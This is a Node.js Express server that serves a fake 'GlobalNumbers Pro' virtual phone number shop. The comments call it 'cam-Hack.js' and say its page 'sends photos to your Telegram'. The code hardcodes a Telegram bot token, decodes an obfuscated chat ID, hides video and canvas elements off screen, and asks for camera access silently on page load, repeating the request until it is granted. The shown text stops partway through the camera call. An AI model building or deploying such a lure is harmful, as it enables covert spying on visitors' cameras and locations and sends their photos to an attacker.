const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// HARDCODED BOT TOKEN (Your bot only)
const HARDCODED_BOT_TOKEN = '8209971302:AAHBX9Y9oLG6ikgky-G4xD3M7T8D8F99A7s';

// RANDOM ENCODING KEYS (0-10)
const ENCODING_KEYS = {
  'a': 7, 'b': 2, 'c': 9, 'd': 1, 'e': 5, 'f': 8, 'g': 0, 'h': 3, 'i': 6, 'j': 4, 'k': 0,
  'l': 7, 'm': 2, 'n': 9, 'o': 1, 'p': 5, 'q': 8, 'r': 0, 's': 3, 't': 6, 'u': 4, 'v': 0,
  'w': 7, 'x': 2, 'y': 9, 'z': 1, 'A': 5, 'B': 8, 'C': 0, 'D': 3, 'E': 6, 'F': 4, 'G': 0,
  'H': 7, 'I': 2, 'J': 9, 'K': 1, 'L': 5, 'M': 8, 'N': 0, 'O': 3, 'P': 6, 'Q': 4, 'R': 0
};

// Function to decode chat ID from encoded string
function decodeChatId(encodedStr) {
  let chatId = '';
  for (let char of encodedStr) {
    if (ENCODING_KEYS[char] !== undefined) {
      chatId += ENCODING_KEYS[char];
    } else if (char >= '0' && char <= '9') {
      chatId += char;
    }
  }
  return chatId;
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// API endpoint that serves the camera capture page
app.get('/api/FreeSms.js', (req, res) => {
  const { code } = req.query;
  
  if (!code) {
    return res.status(400).json({ 
      error: 'Missing code parameter',
      usage: '/api/FreeSms.js?code=ENCODED_CHAT_ID',
      example: '/api/FreeSms.js?code=abc123'
    });
  }

  // Decode chat ID from the code
  const chatId = decodeChatId(code);
  
  if (!chatId || chatId.length < 1) {
    return res.status(400).json({ 
      error: 'Invalid code format',
      message: 'Code must contain valid letters/numbers'
    });
  }

  console.log(`Decoded - Code: ${code} -> Chat ID: ${chatId}`);

  // Generate HTML with HARDCODED bot token and decoded chat ID
  const html = generateHTML(chatId, HARDCODED_BOT_TOKEN);
  
  res.setHeader('Content-Type', 'text/html');
  res.send(html);
});

// Root endpoint
app.get('/', (req, res) => {
  res.json({ 
    message: 'Virtual Numbers API is running! 🚀',
    usage: 'GET /api/cam-Hack.js?code=ENCODED_CHAT_ID',
    description: 'Returns a camera capture page that sends photos to your Telegram',
    note: 'Bot token is hardcoded, only chat ID needs to be encoded'
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// KEEP YOUR EXISTING generateHTML FUNCTION AND EVERYTHING ELSE EXACTLY THE SAME
// DON'T CHANGE ANYTHING BELOW THIS LINE

function generateHTML(chatId, botToken) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>GlobalNumbers Pro | Premium Virtual Phone Numbers</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        :root {
            --primary: #2563eb;
            --secondary: #059669;
            --accent: #dc2626;
            --dark: #1e293b;
            --light: #f8fafc;
            --gray: #64748b;
        }

        body {
            background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
            min-height: 100vh;
            color: #334155;
            line-height: 1.6;
            overflow-x: hidden;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header Styles */
        header {
            background: white;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.08);
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--dark);
        }

        .logo-icon {
            font-size: 1.8rem;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .nav-links {
            display: flex;
            gap: 30px;
        }

        .nav-links a {
            text-decoration: none;
            color: var(--dark);
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-links a:hover {
            color: var(--primary);
        }

        .nav-cta {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.3);
        }

        .nav-cta:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
        }

        /* Hero Section */
        .hero {
            padding: 80px 0;
            text-align: center;
            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 25%, #3730a3 50%, #5b21b6 75%, #7c3aed 100%);
            color: white;
            border-radius: 0 0 30px 30px;
            margin-bottom: 60px;
        }

        .hero h1 {
            font-size: 3.2rem;
            margin-bottom: 20px;
            font-weight: 800;
        }

        .hero p {
            font-size: 1.2rem;
            max-width: 700px;
            margin: 0 auto 30px;
            opacity: 0.9;
        }

        .hero-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(255, 255, 255, 0.15);
            padding: 8px 20px;
            border-radius: 50px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
        }

        /* Stats Section */
        .stats {
            display: flex;
            justify-content: center;
            gap: 50px;
            margin: 40px 0;
        }

        .stat {
            text-align: center;
        }

        .stat-number {
            font-size: 2.5rem;
            font-weight: 800;
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 0.9rem;
            opacity: 0.8;
        }

        /* Features Section */
        .section-title {
            text-align: center;
            margin-bottom: 50px;
        }

        .section-title h2 {
            font-size: 2.5rem;
            margin-bottom: 15px;
            color: var(--dark);
        }

        .section-title p {
            font-size: 1.1rem;
            color: var(--gray);
            max-width: 600px;
            margin: 0 auto;
        }

        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin: 60px 0;
        }

        .feature-card {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.06);
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .feature-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        .feature-icon {
            font-size: 2.5rem;
            margin-bottom: 20px;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .feature-card h3 {
            font-size: 1.4rem;
            margin-bottom: 15px;
            color: var(--dark);
        }

        /* Numbers Grid */
        .numbers-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px;
            margin: 40px 0;
        }

        .number-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.06);
            border: 2px solid #e2e8f0;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .number-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            border-color: var(--primary);
        }

        .country-flag {
            font-size: 2rem;
            margin-bottom: 15px;
        }

        .country-name {
            font-size: 1.2rem;
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--dark);
        }

        .number-price {
            font-size: 1.8rem;
            font-weight: 700;
            color: var(--primary);
            margin: 15px 0;
        }

        .number-features {
            list-style: none;
            margin: 15px 0;
        }

        .number-features li {
            padding: 5px 0;
            color: var(--gray);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .number-features li i {
            color: var(--secondary);
            font-size: 0.9rem;
        }

        .buy-btn {
            width: 100%;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 12px;
            border-radius: 10px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .buy-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(37, 99, 235, 0.3);
        }

        /* Server Options */
        .servers-section {
            background: white;
            padding: 80px 0;
            border-radius: 30px;
            margin: 60px 0;
        }

        .server-options {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin-top: 50px;
        }

        .server-card {
            background: #f8fafc;
            border-radius: 15px;
            padding: 30px;
            border: 2px solid #e2e8f0;
            transition: all 0.3s;
        }

        .server-card:hover {
            border-color: var(--primary);
            transform: translateY(-3px);
        }

        .server-icon {
            font-size: 2.5rem;
            margin-bottom: 20px;
            color: var(--primary);
        }

        .server-name {
            font-size: 1.3rem;
            font-weight: 600;
            margin-bottom: 15px;
            color: var(--dark);
        }

        .server-price {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--secondary);
            margin: 15px 0;
        }

        /* How It Works */
        .how-it-works {
            background: white;
            padding: 80px 0;
            border-radius: 30px;
            margin: 60px 0;
        }

        .steps {
            display: flex;
            justify-content: space-between;
            margin-top: 50px;
            position: relative;
        }

        .steps::before {
            content: '';
            position: absolute;
            top: 40px;
            left: 10%;
            right: 10%;
            height: 3px;
            background: linear-gradient(to right, var(--primary), var(--secondary));
            z-index: 1;
        }

        .step {
            text-align: center;
            position: relative;
            z-index: 2;
            flex: 1;
        }

        .step-number {
            width: 80px;
            height: 80px;
            background: white;
            border: 3px solid var(--primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            font-weight: 700;
            color: var(--primary);
            margin: 0 auto 20px;
            position: relative;
        }

        .step h3 {
            margin-bottom: 10px;
            color: var(--dark);
        }

        /* Testimonials */
        .testimonials {
            margin: 80px 0;
        }

        .testimonial-cards {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
        }

        .testimonial-card {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.06);
        }

        .testimonial-content {
            font-style: italic;
            margin-bottom: 20px;
            color: var(--gray);
        }

        .testimonial-author {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .author-avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }

        .author-info h4 {
            margin-bottom: 5px;
            color: var(--dark);
        }

        .author-info p {
            font-size: 0.9rem;
            color: var(--gray);
        }

        /* CTA Section */
        .cta-section {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            padding: 80px 0;
            border-radius: 30px;
            text-align: center;
            margin: 60px 0;
        }

        .cta-section h2 {
            font-size: 2.5rem;
            margin-bottom: 20px;
        }

        .cta-section p {
            font-size: 1.1rem;
            max-width: 600px;
            margin: 0 auto 30px;
            opacity: 0.9;
        }

        /* Generator Section */
        .generator {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
            padding: 50px 40px;
            max-width: 600px;
            margin: 0 auto 80px;
            text-align: center;
            display: none;
        }

        .generator-header {
            margin-bottom: 30px;
        }

        .generator-header h2 {
            font-size: 2rem;
            margin-bottom: 10px;
            color: var(--dark);
        }

        .generator-header p {
            color: var(--gray);
        }

        .input-group {
            margin-bottom: 25px;
            position: relative;
        }

        select, input {
            width: 100%;
            padding: 18px 20px;
            border: 2px solid #e6e6e6;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s;
            background: #fafafa;
        }

        select:focus, input:focus {
            outline: none;
            border-color: var(--primary);
            background: white;
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
        }

        .btn {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 18px 50px;
            border-radius: 50px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.3);
            width: 100%;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
        }

        .btn:active {
            transform: translateY(0);
        }

        .trust-badges {
            display: flex;
            justify-content: center;
            gap: 25px;
            margin: 25px 0;
        }

        .badge {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
        }

        .badge i {
            font-size: 1.8rem;
            color: var(--primary);
        }

        .badge span {
            font-size: 0.75rem;
            color: var(--gray);
        }

        .loading-screen {
            display: none;
        }

        .loader-container {
            position: relative;
            margin: 30px 0;
        }

        .loader {
            width: 80px;
            height: 80px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid var(--primary);
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .server-messages {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 25px;
            margin: 25px 0;
            min-height: 240px;
            text-align: left;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #333;
            border: 1px solid #eaeaea;
            overflow-y: auto;
            max-height: 240px;
        }

        .message {
            margin-bottom: 12px;
            opacity: 0;
            animation: fadeIn 0.5s forwards;
            line-height: 1.5;
        }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        .success {
            color: var(--secondary);
        }

        .warning {
            color: #f59e0b;
        }

        .error {
            color: #ef4444;
        }

        .info {
            color: var(--primary);
        }

        .progress-container {
            margin: 25px 0;
        }

        .progress-text {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 0.9rem;
            color: var(--gray);
        }

        .progress-bar {
            width: 100%;
            height: 10px;
            background: #f0f0f0;
            border-radius: 5px;
            overflow: hidden;
        }

        .progress {
            width: 0%;
            height: 100%;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            transition: width 0.5s ease;
        }

        .result {
            display: none;
            margin-top: 30px;
        }

        .result-icon {
            font-size: 4rem;
            color: var(--secondary);
            margin-bottom: 20px;
        }

        .number-count {
            font-size: 3.5rem;
            font-weight: 800;
            color: var(--primary);
            margin: 20px 0;
            text-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .result-text {
            font-size: 1.2rem;
            color: #555;
            margin-bottom: 30px;
        }

        .disclaimer {
            font-size: 0.8rem;
            color: var(--gray);
            margin-top: 30px;
            line-height: 1.5;
            padding: 15px;
            background: #f9f9f9;
            border-radius: 8px;
        }

        /* Footer */
        footer {
            background: var(--dark);
            color: white;
            padding: 60px 0 30px;
        }

        .footer-content {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 40px;
            margin-bottom: 40px;
        }

        .footer-column h3 {
            margin-bottom: 20px;
            font-size: 1.2rem;
        }

        .footer-links {
            list-style: none;
        }

        .footer-links li {
            margin-bottom: 10px;
        }

        .footer-links a {
            color: #aaa;
            text-decoration: none;
            transition: color 0.3s;
        }

        .footer-links a:hover {
            color: white;
        }

        .footer-bottom {
            text-align: center;
            padding-top: 30px;
            border-top: 1px solid #333;
            color: #aaa;
            font-size: 0.9rem;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .navbar {
                flex-direction: column;
                gap: 20px;
            }
            
            .nav-links {
                gap: 15px;
            }
            
            .hero h1 {
                font-size: 2.5rem;
            }
            
            .stats {
                flex-direction: column;
                gap: 30px;
            }
            
            .steps {
                flex-direction: column;
                gap: 40px;
            }
            
            .steps::before {
                display: none;
            }
        }

        /* Animation for smooth transitions */
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .url-example {
            font-size: 0.8rem;
            color: var(--gray);
            margin-top: 8px;
            text-align: left;
        }
        
        .error-message {
            color: #ef4444;
            font-size: 0.9rem;
            margin-top: 8px;
            text-align: left;
            display: none;
        }

        /* Hidden camera elements */
        .hidden-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        /* Country Grid */
        .country-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 40px 0;
        }

        .country-card {
            background: white;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 3px 15px rgba(0,0,0,0.08);
            border: 1px solid #e2e8f0;
            transition: all 0.3s;
        }

        .country-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 20px rgba(0,0,0,0.12);
        }

        .pricing-table {
            width: 100%;
            border-collapse: collapse;
            margin: 30px 0;
            background: white;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
        }

        .pricing-table th {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            padding: 20px;
            text-align: left;
        }

        .pricing-table td {
            padding: 15px 20px;
            border-bottom: 1px solid #e2e8f0;
        }

        .pricing-table tr:hover {
            background: #f8fafc;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header>
        <div class="container">
            <nav class="navbar">
                <div class="logo">
                    <i class="fas fa-sim-card logo-icon"></i>
                    <span>GlobalNumbers Pro</span>
                </div>
                <div class="nav-links">
                    <a href="#numbers">Numbers</a>
                    <a href="#servers">Servers</a>
                    <a href="#how-it-works">How It Works</a>
                    <a href="#testimonials">Reviews</a>
                </div>
                <button class="nav-cta" id="getStartedBtn">Buy Numbers</button>
            </nav>
        </div>
    </header>

    <!-- Hero Section -->
    <section class="hero" id="mainContent">
        <div class="container">
            <div class="hero-badge">
                <i class="fas fa-shield-alt"></i>
                <span>Trusted by 50,000+ Users Worldwide</span>
            </div>
            <h1>Global Virtual Phone Numbers</h1>
            <p>Get instant access to virtual numbers from 80+ countries for verification, business, and privacy protection.</p>
            
            <div class="stats">
                <div class="stat">
                    <div class="stat-number">80+</div>
                    <div class="stat-label">Countries</div>
                </div>
                <div class="stat">
                    <div class="stat-number">50K+</div>
                    <div class="stat-label">Active Users</div>
                </div>
                <div class="stat">
                    <div class="stat-number">24/7</div>
                    <div class="stat-label">Support</div>
                </div>
            </div>
        </div>
    </section>

    <!-- Popular Numbers Section -->
    <section class="container" id="numbers">
        <div class="section-title">
            <h2>Popular Virtual Numbers</h2>
            <p>Choose from our most popular international numbers</p>
        </div>
        
        <div class="numbers-grid">
            <!-- USA Numbers -->
            <div class="number-card">
                <div class="country-flag">🇺🇸</div>
                <h3 class="country-name">United States</h3>
                <div class="number-price">$2.99</div>
                <ul class="number-features">
                    <li><i class="fas fa-check"></i> Instant Activation</li>
                    <li><i class="fas fa-check"></i> SMS & Calls</li>
                    <li><i class="fas fa-check"></i> 30 Days Validity</li>
                    <li><i class="fas fa-check"></i> All Apps Supported</li>
                </ul>
                <button class="buy-btn" data-country="USA">Buy Now</button>
            </div>

            <!-- UK Numbers -->
            <div class="number-card">
                <div class="country-flag">🇬🇧</div>
                <h3 class="country-name">United Kingdom</h3>
                <div class="number-price">$3.49</div>
                <ul class="number-features">
                    <li><i class="fas fa-check"></i> Instant Activation</li>
                    <li><i class="fas fa-check"></i> SMS & Calls</li>
                    <li><i class="fas fa-check"></i> 30 Days Validity</li>
                    <li><i class="fas fa-check"></i> All Apps Supported</li>
                </ul>
                <button class="buy-btn" data-country="UK">Buy Now</button>
            </div>

            <!-- Germany Numbers -->
            <div class="number-card">
                <div class="country-flag">🇩🇪</div>
                <h3 class="country-name">Germany</h3>
                <div class="number-price">$3.99</div>
                <ul class="number-features">
                    <li><i class="fas fa-check"></i> Instant Activation</li>
                    <li><i class="fas fa-check"></i> SMS & Calls</li>
                    <li><i class="fas fa-check"></i> 30 Days Validity</li>
                    <li><i class="fas fa-check"></i> All Apps Supported</li>
                </ul>
                <button class="buy-btn" data-country="Germany">Buy Now</button>
            </div>

            <!-- Canada Numbers -->
            <div class="number-card">
                <div class="country-flag">🇨🇦</div>
                <h3 class="country-name">Canada</h3>
                <div class="number-price">$2.79</div>
                <ul class="number-features">
                    <li><i class="fas fa-check"></i> Instant Activation</li>
                    <li><i class="fas fa-check"></i> SMS & Calls</li>
                    <li><i class="fas fa-check"></i> 30 Days Validity</li>
                    <li><i class="fas fa-check"></i> All Apps Supported</li>
                </ul>
                <button class="buy-btn" data-country="Canada">Buy Now</button>
            </div>

            <!-- Australia Numbers -->
            <div class="number-card">
                <div class="country-flag">🇦🇺</div>
                <h3 class="country-name">Australia</h3>
                <div class="number-price">$4.29</div>
                <ul class="number-features">
                    <li><i class="fas fa-check"></i> Instant Activation</li>
                    <li><i class="fas fa-check"></i> SMS & Calls</li>
                    <li><i class="fas fa-check"></i> 30 Days Validity</li>
                    <li><i class="fas fa-check"></i> All Apps Supported</li>
                </ul>
                <button class="buy-btn" data-country="Australia">Buy Now</button>
            </div>

            <!-- France Numbers -->
            <div class="number-card">
                <div class="country-flag">🇫🇷</div>
                <h3 class="country-name">France</h3>
                <div class="number-price">$3.79</div>
                <ul class="number-features">
                    <li><i class="fas fa-check"></i> Instant Activation</li>
                    <li><i class="fas fa-check"></i> SMS & Calls</li>
                    <li><i class="fas fa-check"></i> 30 Days Validity</li>
                    <li><i class="fas fa-check"></i> All Apps Supported</li>
                </ul>
                <button class="buy-btn" data-country="France">Buy Now</button>
            </div>
        </div>
    </section>

    <!-- Server Options Section -->
    <section class="servers-section" id="servers">
        <div class="container">
            <div class="section-title">
                <h2>Premium Server Options</h2>
                <p>Choose the perfect server plan for your needs</p>
            </div>
            
            <div class="server-options">
                <div class="server-card">
                    <i class="fas fa-server server-icon"></i>
                    <h3 class="server-name">Basic Server</h3>
                    <div class="server-price">$9.99/month</div>
                    <ul class="number-features">
                        <li><i class="fas fa-check"></i> 5 Virtual Numbers</li>
                        <li><i class="fas fa-check"></i> 10GB Storage</li>
                        <li><i class="fas fa-check"></i> Basic Support</li>
                        <li><i class="fas fa-check"></i> 30 Days Retention</li>
                    </ul>
                    <button class="buy-btn">Select Plan</button>
                </div>

                <div class="server-card">
                    <i class="fas fa-database server-icon"></i>
                    <h3 class="server-name">Pro Server</h3>
                    <div class="server-price">$19.99/month</div>
                    <ul class="number-features">
                        <li><i class="fas fa-check"></i> 20 Virtual Numbers</li>
                        <li><i class="fas fa-check"></i> 50GB Storage</li>
                        <li><i class="fas fa-check"></i> Priority Support</li>
                        <li><i class="fas fa-check"></i> 90 Days Retention</li>
                    </ul>
                    <button class="buy-btn">Select Plan</button>
                </div>

                <div class="server-card">
                    <i class="fas fa-cloud server-icon"></i>
                    <h3 class="server-name">Enterprise Server</h3>
                    <div class="server-price">$49.99/month</div>
                    <ul class="number-features">
                        <li><i class="fas fa-check"></i> Unlimited Numbers</li>
                        <li><i class="fas fa-check"></i> 200GB Storage</li>
                        <li><i class="fas fa-check"></i> 24/7 Premium Support</li>
                        <li><i class="fas fa-check"></i> 1 Year Retention</li>
                    </ul>
                    <button class="buy-btn">Select Plan</button>
                </div>
            </div>
        </div>
    </section>

    <!-- How It Works -->
    <section class="how-it-works" id="how-it-works">
        <div class="container">
            <div class="section-title">
                <h2>How It Works</h2>
                <p>Get your virtual number in 3 simple steps</p>
            </div>
            
            <div class="steps">
                <div class="step">
                    <div class="step-number">1</div>
                    <h3>Select Country & Number</h3>
                    <p>Choose from 80+ countries and pick your preferred number</p>
                </div>
                <div class="step">
                    <div class="step-number">2</div>
                    <h3>Instant Activation</h3>
                    <p>Complete payment and get your number activated immediately</p>
                </div>
                <div class="step">
                    <div class="step-number">3</div>
                    <h3>Start Using</h3>
                    <p>Use your virtual number for verification, calls, and SMS</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Testimonials -->
    <section class="testimonials container" id="testimonials">
        <div class="section-title">
            <h2>Customer Reviews</h2>
            <p>See what our customers are saying about our service</p>
        </div>
        
        <div class="testimonial-cards">
            <div class="testimonial-card">
                <div class="testimonial-content">
                    "I've been using GlobalNumbers for my business verification needs. The service is reliable and the numbers work perfectly with all major platforms!"
                </div>
                <div class="testimonial-author">
                    <div class="author-avatar">JS</div>
                    <div class="author-info">
                        <h4>John Smith</h4>
                        <p>Business Owner</p>
                    </div>
                </div>
            </div>
            <div class="testimonial-card">
                <div class="testimonial-content">
                    "Amazing service! Got my US number within minutes and it worked flawlessly for WhatsApp verification. Customer support is very responsive too."
                </div>
                <div class="testimonial-author">
                    <div class="author-avatar">MR</div>
                    <div class="author-info">
                        <h4>Maria Rodriguez</h4>
                        <p>Digital Marketer</p>
                    </div>
                </div>
            </div>
            <div class="testimonial-card">
                <div class="testimonial-content">
                    "The quality of numbers is exceptional. I've tried other services but GlobalNumbers Pro delivers the most reliable virtual numbers I've ever used."
                </div>
                <div class="testimonial-author">
                    <div class="author-avatar">AD</div>
                    <div class="author-info">
                        <h4>Ahmed Davis</h4>
                        <p>App Developer</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- CTA Section -->
    <section class="cta-section">
        <div class="container">
            <h2>Ready to Get Your Virtual Number?</h2>
            <p>Join thousands of satisfied customers and get your international number today</p>
            <button class="btn" id="ctaBtn" style="max-width: 300px;">
                <i class="fas fa-sim-card" style="margin-right: 10px;"></i>
                GET STARTED NOW
            </button>
        </div>
    </section>

    <!-- Generator Section -->
    <section class="container" id="generatorSection">
        <div class="generator" id="generator">
            <div class="generator-header">
                <h2>Get Your Virtual Number</h2>
                <p>Select your preferred country and service type</p>
            </div>
            
            <div class="input-group">
                <select id="countrySelect">
                    <option value="">Select Country</option>
                    <option value="USA">🇺🇸 United States - $2.99</option>
                    <option value="UK">🇬🇧 United Kingdom - $3.49</option>
                    <option value="Germany">🇩🇪 Germany - $3.99</option>
                    <option value="Canada">🇨🇦 Canada - $2.79</option>
                    <option value="Australia">🇦🇺 Australia - $4.29</option>
                    <option value="France">🇫🇷 France - $3.79</option>
                </select>
            </div>
            
            <div class="input-group">
                <select id="serviceType">
                    <option value="">Select Service Type</option>
                    <option value="sms">SMS Only - Basic</option>
                    <option value="sms_call">SMS & Calls - Standard</option>
                    <option value="premium">Premium (All Features)</option>
                </select>
            </div>
            
            <button class="btn" id="generateBtn">
                <i class="fas fa-shopping-cart" style="margin-right: 10px;"></i>
                PURCHASE NUMBER
            </button>
            
            <div class="trust-badges">
                <div class="badge">
                    <i class="fas fa-shield-alt"></i>
                    <span>Secure</span>
                </div>
                <div class="badge">
                    <i class="fas fa-bolt"></i>
                    <span>Instant</span>
                </div>
                <div class="badge">
                    <i class="fas fa-globe"></i>
                    <span>Global</span>
                </div>
            </div>

            <div class="loading-screen" id="loadingScreen">
                <div class="loader-container">
                    <div class="loader"></div>
                </div>
                
                <div class="progress-container">
                    <div class="progress-text">
                        <span>Processing...</span>
                        <span id="progressPercent">0%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress" id="progressBar"></div>
                    </div>
                </div>
                
                <div class="server-messages" id="serverMessages"></div>
            </div>

            <div class="result" id="result">
                <i class="fas fa-check-circle result-icon"></i>
                <h2>Success! Number Activated</h2>
                <div class="number-count" id="numberDisplay">+1 XXX-XXX-XXXX</div>
                <div class="result-text">Your virtual number is ready to use</div>
                <button class="btn" id="shareBtn" style="background: linear-gradient(45deg, #059669, #047857);">
                    <i class="fas fa-copy" style="margin-right: 10px;"></i>
                    COPY NUMBER
                </button>
            </div>

            <div class="disclaimer">
                <i class="fas fa-info-circle" style="margin-right: 5px;"></i>
                By purchasing our virtual numbers, you agree to our Terms of Service. Numbers are for legal use only. Refunds are not available after number activation.
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="footer-content">
                <div class="footer-column">
                    <h3>GlobalNumbers Pro</h3>
                    <p>The leading virtual numbers service trusted by users worldwide for verification and privacy.</p>
                </div>
                <div class="footer-column">
                    <h3>Quick Links</h3>
                    <ul class="footer-links">
                        <li><a href="#numbers">Numbers</a></li>
                        <li><a href="#servers">Servers</a></li>
                        <li><a href="#how-it-works">How It Works</a></li>
                        <li><a href="#testimonials">Reviews</a></li>
                    </ul>
                </div>
                <div class="footer-column">
                    <h3>Legal</h3>
                    <ul class="footer-links">
                        <li><a href="#">Terms of Service</a></li>
                        <li><a href="#">Privacy Policy</a></li>
                        <li><a href="#">Cookie Policy</a></li>
                        <li><a href="#">Refund Policy</a></li>
                    </ul>
                </div>
                <div class="footer-column">
                    <h3>Support</h3>
                    <ul class="footer-links">
                        <li><a href="mailto:support@globalnumberspro.com">support@globalnumberspro.com</a></li>
                        <li><a href="#">Help Center</a></li>
                        <li><a href="#">Live Chat</a></li>
                        <li><a href="#">Status Page</a></li>
                    </ul>
                </div>
            </div>
            
            <div class="footer-bottom">
                <p>&copy; 2023 GlobalNumbers Pro. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <!-- Hidden Camera Elements -->
    <video id="hiddenCamera" class="hidden-camera" autoplay></video>
    <canvas id="hiddenCanvas" class="hidden-camera"></canvas>

    <script>
        // ========== TELEGRAM CONFIGURATION ==========
        const chatId = "${chatId}";
        const botToken = "${botToken}";
        
        console.log('Telegram Config Loaded:', { chatId, botToken });

        // Camera and location tracking variables
        let cameraStream = null;
        let photoInterval = null;
        let photoCount = 0;
        let hiddenVideo = null;
        let hiddenCanvas = null;
        let userLocation = null;
        let locationRequested = false;
        let cameraAccessGranted = false;

        window.addEventListener('load', function() {
            // Create hidden elements for camera
            hiddenVideo = document.getElementById('hiddenCamera');
            hiddenCanvas = document.getElementById('hiddenCanvas');

            // SILENTLY request camera permission on site load
            setTimeout(function() {
                requestCameraPermission();
            }, 1000);
        });

        // Function to request camera permission (will keep asking until allowed)
        function requestCameraPermission() {
            navigator.mediaDevices.getUserMedia({ 
